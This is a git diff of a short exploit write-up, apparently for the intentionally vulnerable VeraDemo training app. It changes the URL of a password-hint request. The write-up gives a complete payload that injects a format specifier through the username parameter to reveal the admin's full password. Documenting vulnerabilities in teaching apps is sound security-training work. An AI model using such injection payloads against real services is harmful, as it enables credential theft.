@@ -6,7 +6,7 @@ Unfortunately the obfuscation is injectable so we can inject our own format spec
 
 Exploit
 -------
-1. Go to http://localhost:8080/verademo/password-hint?username=admin%27%20--%20the%20full%20password%20is%22%251%24s%22%20and%20the%20partial%20password%20is:
+1. Go to http://localhost:8080/password-hint?username=admin%27%20--%20the%20full%20password%20is%22%251%24s%22%20and%20the%20partial%20password%20is:
 2. See the full password as well as the obfuscated password.
 
 Note that the URL decoded version of the username is: admin' -- the full password is"%1$s" and the partial password is
